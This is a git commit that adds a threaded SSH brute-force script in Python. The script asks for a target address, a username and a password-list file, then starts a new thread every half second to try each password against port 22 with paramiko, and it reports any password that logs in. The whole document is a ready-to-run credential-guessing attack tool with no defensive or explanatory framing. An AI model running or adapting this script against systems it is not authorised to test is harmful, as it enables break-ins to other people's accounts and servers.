3e82c71d576975ea7e8bfb8858d3d0aa42b3ba57
Hardmaterial <yelionel26@gmail.com>
2021-06-13 10:58:01 -0400

    SSH Bruteforcer

---
+++ sshbruteforce/sshbrutethreaded.py
@@ -0,0 +1,42 @@
+import os
+import sys
+import threading
+import time
+
+import paramiko
+import termcolor
+
+stop_flag = 0
+
+def ssh_connect(password):
+    global stop_flag
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+        stop_flag = 1
+        print(termcolor.colored(f'[+] Found Password: {password} For Account: {username}', 'green'))
+    except:
+        print(termcolor.colored((f'[-] Incorrect Login: {password}'), 'red'))
+    ssh.close()
+
+host = input('[+] Target Address: ')
+username = input('[+] SSH Username: ')
+input_file = input('[+] Passwords File: ')
+print('\n')
+
+if os.path.exists(input_file) == False:
+    print('[!!] That File/Path Doesnt Exist')
+    sys.exit(1)
+
+print(f'* * * Starting Threaded SSH Bruteforce On {host} With Account: {username} * * *')
+
+with open(input_file, 'r') as file:
+    for line in file.readlines():
+        if stop_flag == 1:
+            t.join()
+            exit()
+        password = line.strip()
+        t = threading.Thread(target=ssh_connect, args=(password,))
+        t.start()
+        time.sleep(0.5)
